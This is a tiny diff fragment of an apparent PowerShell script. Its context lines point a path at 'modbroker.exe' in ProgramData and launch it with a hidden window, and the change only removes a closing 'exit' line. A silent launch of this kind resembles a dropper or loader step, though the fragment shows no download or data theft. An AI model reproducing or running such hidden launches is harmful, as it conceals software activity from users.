@@ -10,4 +10,3 @@ $outputPath = "$env:ProgramData\modbroker.exe"
 
 Start-Process -FilePath $outputPath -WindowStyle Hidden
 
-exit
